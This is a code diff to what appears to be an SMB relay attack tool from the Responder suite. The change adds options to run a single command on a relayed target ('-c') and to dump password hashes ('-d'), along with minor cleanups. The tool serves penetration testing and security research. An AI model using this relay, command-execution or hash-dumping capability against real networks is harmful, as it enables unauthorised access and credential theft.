@@ -36,7 +36,7 @@ from SMBFinger.Finger import RunFinger
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))
 from socket import *
 
-__version__ = "1.1"
+__version__ = "1.2"
 
 def UserCallBack(op, value, dmy, parser):
     args=[]
@@ -50,7 +50,9 @@ def UserCallBack(op, value, dmy, parser):
 parser = optparse.OptionParser(usage="python %prog -t10.20.30.40 -u Administrator lgandx admin", version=__version__, prog=sys.argv[0])
 parser.add_option('-t',action="store", help="Target server for SMB relay.",metavar="10.20.30.45",dest="TARGET")
 parser.add_option('-p',action="store", help="Additional port to listen on, this will relay for proxy, http and webdav incoming packets.",metavar="8081",dest="ExtraPort")
-parser.add_option('-u', '--UserToRelay', action="callback", callback=UserCallBack, dest="UserToRelay")
+parser.add_option('-u', '--UserToRelay', help="Users to relay. Use '-u ALL' to relay all users.", action="callback", callback=UserCallBack, dest="UserToRelay")
+parser.add_option('-c', '--command', action="store", help="Single command to run (scripting)", metavar="whoami",dest="OneCommand")
+parser.add_option('-d', '--dump', action="store_true", help="Dump hashes (scripting)", metavar="whoami",dest="Dump")
 
 options, args = parser.parse_args()
 
@@ -65,6 +67,8 @@ if options.UserToRelay is None:
 if options.ExtraPort is None:
     options.ExtraPort = 0
 
+OneCommand = options.OneCommand
+Dump = options.Dump
 ExtraPort = options.ExtraPort
 UserToRelay = options.UserToRelay
 Host = options.TARGET, 445
@@ -469,7 +473,6 @@ def RunShellCmd(data, s, clientIP, Host, Username, Domain):
         print "[+] Relay Failed, Tree Connect AndX denied. This is a low privileged user or SMB Signing is mandatory.\n[+] Hashes were saved anyways in Responder/logs/ folder.\n"
         Logs.info(clientIP+":"+Username+":"+Domain+":"+Host[0]+":Logon Failure")
         return False
-        return False
 
     # This one should not happen since we always use the IP address of the target in our tree connects, but just in case.. 
     if data[8:10] == "\x75\xcc":
@@ -487,8 +490,19 @@ def RunShellCmd(data, s, clientIP, Host, Username, Domain):
         s.send(buffer1)
         data = s.recv(2048)
 
+    ## Run one command.
+    if data[8:10] == "\x75\x00" and OneCommand != None or Dump:
+        print "[+] Authenticated."
+        if OneCommand != None:
+           print "[+] Running command: %s"%(OneCommand)
+           RunCmd(data, s, clientIP, Username, Domain, OneCommand, Logs, Host)
+        if Dump:
+           print "[+] Dumping hashes"
+           DumpHashes(data, s, Host)
+        os._exit(1)
+
     ## Drop into the shell.
-    if data[8:10] == "\x75\x00":
+    if data[8:10] == "\x75\x00" and OneCommand == None:
         print "[+] Authenticated.\n[+] Dropping into Responder's interactive shell, type \"exit\" to terminate\n"
         ShowHelp()
         #Make sure we don't open 2 shell at the same time..
@@ -598,7 +612,7 @@ def main():
           while True:
                time.sleep(1)
 
-     except KeyboardInterrupt:
+     except (KeyboardInterrupt, SystemExit):
           sys.exit("\rExiting...")
 
 if __name__ == '__main__':
